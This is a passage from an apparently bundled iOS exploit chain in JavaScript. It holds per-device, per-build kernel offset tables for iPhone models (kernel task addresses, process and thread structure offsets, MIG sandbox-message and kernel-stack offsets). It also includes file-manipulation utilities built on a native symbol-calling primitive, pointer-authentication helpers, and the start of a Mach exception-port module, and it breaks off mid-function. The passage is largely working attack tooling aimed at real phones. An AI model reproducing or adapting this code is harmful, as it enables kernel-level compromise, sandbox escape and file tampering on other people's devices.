					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x390n,
					ctid: 0x418n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x94c2d0n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				4: {
					kernelTask: 0x9546e0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x954b30n
				},
				6: {
					kernelTask: 0x954a90n
				},
				6.1: {
					kernelTask: 0x954ae0n
				}
			},
			24: {
				0: {
					kernelTask: 0xa295e0n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa2d5f8n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa35a20n
				},
				3: {
					kernelTask: 0xa2da20n
				},
				4: {
					kernelTask: 0xa9ebe8n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n,
					migLock: 0x37b8b80n,
					migSbxMsg: 0x37b8ba0n,
					migKernelStackLR: 0x3190fa0n
				},
				5: {
					kernelTask: 0xaa6cd0n,
					migLock: 0x37d4c90n,
					migSbxMsg: 0x37d4cb0n,
					migKernelStackLR: 0x31acce4n
				},
				6: {
					kernelTask: 0xaaade0n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n,
					migLock: 0x37dcc90n,
					migSbxMsg: 0x37dccb0n,
					migKernelStackLR: 0x31b5b60n,
				}
			}
		}
	},

	// iPhone 13
	// iPhone 13 Mini
	// iPhone 13 Pro
	// iPhone 13 Pro Max
	// iPhone SE 3
	// iPhone 14
	// iPhone 14 Plus
	"iPhone14": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918ee0n,
				},
				4: {
					kernelTask: 0x91d318n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x925770n
				},
				6: {
					kernelTask: 0x9256d0n
				},
				6.1: {
					kernelTask: 0x925720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f6230n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f6248n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0xa02678n
				},
				3: {
					kernelTask: 0x9fa678n
				},
				4: {
					kernelTask: 0xa67b18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x382c218n,
					migSbxMsg: 0x382c238n,
					migKernelStackLR: 0x317d020n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x3848428n,
					migSbxMsg: 0x3848448n,
					migKernelStackLR: 0x31994a4n
				},
				6: {
					kernelTask: 0xa73d10n,
					guardExcCode: 0x340n,
					taskThreads: 0x390n,
					tro: 0x398n,
					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x38543a8n,
					migSbxMsg: 0x38543c8n,
					migKernelStackLR: 0x31a27e0n,
				}
			}
		},
		"6": {
			23: {
				4: {
					kernelTask: 0x92d318n
				},
				5: {
					kernelTask: 0x935770n
				},
				6: {
					kernelTask: 0x9316d0n
				},
				6.1: {
					kernelTask: 0x931720n
				}
			},
			24: {
				0: {
					kernelTask: 0xa06230n
				},
				1: {
					kernelTask: 0xa06248n
				},
				2: {
					kernelTask: 0xa12678n
				},
				3: {
					kernelTask: 0xa0a678n
				},
				4: {
					kernelTask: 0xa77b18n,
					migLock: 0x3898c18n,
					migSbxMsg: 0x3898c38n,
					migKernelStackLR: 0x31dff60n
				},
				5: {
					kernelTask: 0xa7fc00n,
					migLock: 0x38b4e28n,
					migSbxMsg: 0x38b4e48n,
					migKernelStackLR: 0x31fc3e4n
				},
				6: {
					kernelTask: 0xa83d10n,
					migLock: 0x38bcda8n,
					migSbxMsg: 0x38bcdc8n,
					migKernelStackLR: 0x3205560n,
				}
			}
		},
		"7": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		}
	},

	// iPhone 14 Pro
	// iPhone 14 Pro Max
	// iPhone 15
	// iPhone 15 Plus
	"iPhone15": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x914e00n,
				},
				4: {
					kernelTask: 0x919238n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x921690n
				},
				6: {
					kernelTask: 0x9215f0n
				},
				6.1: {
					kernelTask: 0x921640n
				},
				6.2: {
					kernelTask: 0x91d640n
				}
			},
			24: {
				0: {
					kernelTask: 0x9ee150n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f2168n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0x9fe598n
				},
				3: {
					kernelTask: 0x9f6598n
				},
				4: {
					kernelTask: 0xa67c18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x37863f8n,
					migSbxMsg: 0x3786418n,
					migKernelStackLR: 0x3131620n
				},
				5: {
					kernelTask: 0xa6fd00n,
					migLock: 0x37a2788n,
					migSbxMsg: 0x37a27a8n,
					migKernelStackLR: 0x314dc24n
				},
				6: {
					kernelTask: 0xa6fe10n,
  					guardExcCode: 0x340n,
					taskThreads: 0x390n,
  					tro: 0x398n,
  					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x37aa708n,
					migSbxMsg: 0x37aa728n,
					migKernelStackLR: 0x3152ee0n
				}
			}
		},
		"4": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		}
	},

	// iPhone 15 Pro
	// iPhone 15 Pro Max
	"iPhone16": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0x140n,
					ropPid: 0x1b0n,
					jopPid: 0x1b8n,
					guardExcCode: 0x380n,
					taskThreads: 0x3c0n,
					tro: 0x3d0n,
					ast: 0x3f4n,
					mutexData: 0x400n,
					ctid: 0x480n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x978ef0n,
				},
				4: {
					kernelTask: 0x991eb0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					options: 0xc0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3c8n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				5: {
					kernelTask: 0x99a308n,
				},
				6: {
					kernelTask: 0x99a268n
				},
				6.1: {
					kernelTask: 0x99a2b8n
				},
				6.2: {
					kernelTask: 0x9962b8n
				}
			},
			24: {
				0: {
					kernelTask: 0xaae870n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x490n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xaae888n,
					taskThreads: 0x3d0n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				2: {
					kernelTask: 0xab6cb8n
				},
				3: {
					kernelTask: 0xab2cb8n
				},
				4: {
					kernelTask: 0xb23d28n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x498n,
					migLock: 0x3c03ef0n,
					migSbxMsg: 0x3c03f10n,
					migKernelStackLR: 0x3582fe0n
				},
				5: {
					kernelTask: 0xb2be10n,
					migLock: 0x3c181a8n,
					migSbxMsg: 0x3c181c8n,
					migKernelStackLR: 0x35993a4n
				},
				6: {
					kernelTask: 0xb2ff20n,
  					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a0n,
					migLock: 0x3c241a8n,
					migSbxMsg: 0x3c241c8n,
					migKernelStackLR: 0x35a26a0n,
				}
			}
		}
	},
	// iPhone 16
	// iPhone 16 plus
	// iPhone 16 pro
	// iPhone 16 pro max
	"iPhone17": {
		"*": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x4042dc0n,
					migSbxMsg: 0x4042de0n,
					migKernelStackLR: 0x3912aa0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x405eff8n,
					migSbxMsg: 0x405f018n,
					migKernelStackLR: 0x392be64n
				},
				6: {
					kernelTask: 0xc1bf78n,
  					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
  					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x4066f88n,
					migSbxMsg: 0x4066fa8n,
					migKernelStackLR: 0x39352e0n,
				}
			}
		},
		"5": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x408acd0n,
					migSbxMsg: 0x408acf0n,
					migKernelStackLR: 0x396e4a0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x40a6f08n,
					migSbxMsg: 0x40a6f28n,
					migKernelStackLR: 0x3987924n
				},
				6: {
					kernelTask: 0xc1ff78n,
					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x40b6e98n,
					migSbxMsg: 0x40b6eb8n,
					migKernelStackLR: 0x3998de0n,
				}
			}
		}
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/FileUtils.js":
/*!***************************************!*\
  !*** ./src/libs/JSUtils/FileUtils.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ FileUtils)
/* harmony export */ });


const TAG = "FILE-UTILS";

const O_RDONLY	= 0x0000;
const O_WRONLY	= 0x0001;
const O_RDWR	= 0x0002;
const O_APPEND  = 0x0008;
const O_CREAT	= 0x0200;
const O_TRUNC	= 0x0400;
const O_EVTONLY	= 0x8000;

const ERROR		= -1;

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

const SEEK_SET = 0;

class FileUtils {


	static open(path) {
		const fd = Native.callSymbol("open", path, O_RDONLY);
		if (fd == ERROR) {
			console.log(TAG, "Unable to open: " + path);
			return false;
		}
		return fd;
	}

	static close(fd) {
		Native.callSymbol("close", fd);
	}

	static read(fd, size=0) {
		if (!size || size > Native.memSize)
			size = Native.memSize;
		const len = Native.callSymbol("read", fd, Native.mem, size);
		if (!len || len == ERROR)
			return false;
		const buff = Native.read(Native.mem, len);
		return buff;
	}

	static readFile(path, seek=0, length=0) {
		const fd = this.open(path);
		if (fd === false)
			return null;

		let data = new Uint8Array();

		if (seek)
			Native.callSymbol("lseek", fd, seek, SEEK_SET);

		let remaining = length;

		while (true) {
			let size = remaining ? remaining : Native.memSize;
			if (size > Native.memSize)
				size = Native.memSize;
			const buff = this.read(fd, size);
			if (buff === false)
				break;
			const buff8 = new Uint8Array(buff);
			let newData = new Uint8Array(data.length + buff8.length);
			newData.set(data, 0);
			newData.set(buff8, data.length);
			data = newData;

			if (remaining) {
				remaining -= buff.byteLength;
				if (!remaining)
					break;
			}
		}

		this.close(fd);

		return data.buffer;
	}

	static writeFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);
	}

	static appendFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);
	}

	static deleteFile(path) {
		Native.callSymbol("unlink", path);
	}
	static foreachDir(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_DIR:
					if (item.d_name.startsWith("."))
						break;
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
	}

	static foreachFile(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return false;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_REG:
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
		return true;
	}

	static createDir(path, permission=0o755) {
		return !Native.callSymbol("mkdir", path, permission);
	}

	static deleteDir(path, recursive=false) {
		if (recursive) {
			const dir = Native.callSymbol("opendir", path);
			if (!dir) {
				console.log(TAG, "deleteDir: Unable to open dir: " + path);
				return false;
			}

			while (true) {
				const item = this.#readdir(dir);
				if (!item)
					break;

				const newPath = path + '/' + item.d_name;

				switch (item.d_type) {
					case DT.DT_DIR:
						if (item.d_name.startsWith("."))
							break;
						this.deleteDir(newPath, true);
						break;

					case DT.DT_REG:
						console.log(TAG, `deleting: ${newPath}`);
						this.deleteFile(newPath);
						break;
				}
			}

			Native.callSymbol("closedir", dir);
		}

		return !Native.callSymbol("rmdir", path);
	}

	static exists(path, permission=0/*F_OK*/) {
		return !Native.callSymbol("access", path, permission);
	}

	static stat(path) {
		const ret = Native.callSymbol("stat", path, Native.mem);
		if (ret == ERROR)
			return null;
		const buff = Native.read(Native.mem, 144);
		const view = new DataView(buff);

		const dev = view.getInt32(0, true);
		const mode = view.getUint16(0x4, true);
		const nlink = view.getUint16(0x6, true);
		const ino = view.getBigUint64(0x8, true);
		const uid = view.getUint32(0x10, true);
		const gid = view.getUint32(0x14, true);
		const atime_tv_sec = view.getBigInt64(0x20, true);
		const mtime_tv_sec = view.getBigInt64(0x30, true);
		const ctime_tv_sec = view.getBigInt64(0x40, true);
		const size = view.getBigInt64(0x60, true);

		return {
			mode: Number(mode),
			ino: Number(ino),
			dev: Number(dev),
			nlink: Number(nlink),
			uid: Number(uid),
			gid: Number(gid),
			size: Number(size),
			atime: Number(atime_tv_sec),
			mtime: Number(mtime_tv_sec),
			ctime: Number(ctime_tv_sec)
		};
	}

	static #readdir(dir) {
		const itemPtr = Native.callSymbol("readdir", dir);
		if (!itemPtr)
			return null;

		const item = Native.read(itemPtr, 24);
		const view = new DataView(item);

		const d_ino = view.getBigUint64(0, true);
		const d_namlen = view.getUint16(18, true);
		const d_type = view.getUint8(20);
		const d_name = Native.readString(itemPtr + 21n, d_namlen + 1);

		return {
			d_ino: d_ino,
			d_type: d_type,
			d_name: d_name
		};
	}

	static #commonWriteFile(path, data, flags) {
		const fd = Native.callSymbol("open", path, flags, 0o644);
		if (fd == ERROR) {
			console.log(TAG, "Unable to open: " + path);
			return false;
		}

		// For some reason file mode is not applied on open()
		Native.callSymbol("fchmod", fd, 0o644);

		let offs = 0;
		let left = data.byteLength;

		const buffSize = 0x4000;
		const buffPtr = Native.callSymbol("malloc", buffSize);

		while (true) {
			const size = left > buffSize ? buffSize : left;
			const src8 = new Uint8Array(data, offs, size);
			const dst8 = new Uint8Array(src8);
			Native.write(buffPtr, dst8.buffer);
			const len = Native.callSymbol("write", fd, buffPtr, size);
			if (!len || len == ERROR)
				break;
			offs += len;
			left -= len;
			if (!left)
				break;
		}

		Native.callSymbol("free", buffPtr);
		Native.callSymbol("close", fd);

		return true;
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/Utils.js":
/*!***********************************!*\
  !*** ./src/libs/JSUtils/Utils.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Utils)
/* harmony export */ });


const TAG = "UTILS";

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

class Utils {

	static UINT64_SIZE = 8;
	static UINT32_SIZE = 4;
	static UINT16_SIZE = 2;
	static ARM_THREAD_STATE64 = 6;
	static ARM_THREAD_STATE64_SIZE = 0x110;
	static ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);
	static ptrauth_key_asia = 0;
	static EXC_BAD_ACCESS = 1n;
	static EXC_GUARD = 12n;
	static EXC_MASK_GUARD = (1n << this.EXC_GUARD);
	static EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);
	static EXCEPTION_STATE = 2n;
	static MACH_EXCEPTION_CODES = 0x80000000n;
	static PAGE_SIZE = 0x4000n;
	static PAGE_MASK = (this.PAGE_SIZE - 1n);

	static hex(val) {
		return val.toString(16);
	}

	static memmem(haystack, needle) {
		const hLen = haystack.byteLength;
		const nLen = needle.byteLength;

		if (nLen === 0 || hLen < nLen) {
		  return 0;
		}

		const haystackView = new Uint8Array(haystack);
		const needleView = new Uint8Array(needle);

		for (let i = 0; i <= hLen - nLen; i++) {
		  let found = true;
		  for (let j = 0; j < nLen; j++) {
			if (haystackView[i + j] !== needleView[j]) {
			  found = false;
			  break;
			}
		  }
		  if (found) {
			return i;
		  }
		}

		return 0;
	}

	static ptrauth_string_discriminator(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481n;
			case "lr":
				return 0x77d3n;
			case "sp":
				return 0xcbedn;
			case "fp":
				return 0x4517n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_string_discriminator_special(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481000000000000n;
			case "lr":
				return 0x77d3000000000000n;
			case "sp":
				return 0xcbed000000000000n;
			case "fp":
				return 0x4517000000000000n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_blend_discriminator(diver,discriminator)
	{
		return diver & 0xFFFFFFFFFFFFn | discriminator;
	}

    static printArrayBufferInChunks(buffer) {
        const view = new DataView(buffer);
        const chunkSize = 8;

        for (let i = 0; i < buffer.byteLength; i += chunkSize) {
			// Read the chunk as a BigInt
			const chunk = view.getBigUint64(i, true); // Little-endian

            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);
        }
    }

	static MIN(a, b)
	{
		if(a < b)
			return a;
		return b;
	}

	static MAX(a, b)
	{
		if(a > b)
			return a;
		return b;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/Exception.js":
/*!***************************************!*\
  !*** ./src/libs/TaskRop/Exception.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Exception)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./ExceptionReplyStruct */ "./src/libs/TaskRop/ExceptionReplyStruct.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");


const TAG = "EXCEPTION";

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;
const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;
const MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;

class Exception
{
	static ExceptionMessageSize = 0x160n;
	static ExceptionReplySize = 0x13cn;

	static createPort()
	{
		let options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		let exceptionPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct",0x203, options, 0n, exceptionPortPtr);
		if (kr != 0)
		{
			console.log(TAG,`Error creating exception port:${kr}`);
			return 0;
		}
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(exceptionPortPtr);
		return BigInt(port);
	}

	static waitException(exceptionPort, excBuffer, timeout, debug)
	{
		let t1 = new Date().getTime();
		if (debug)
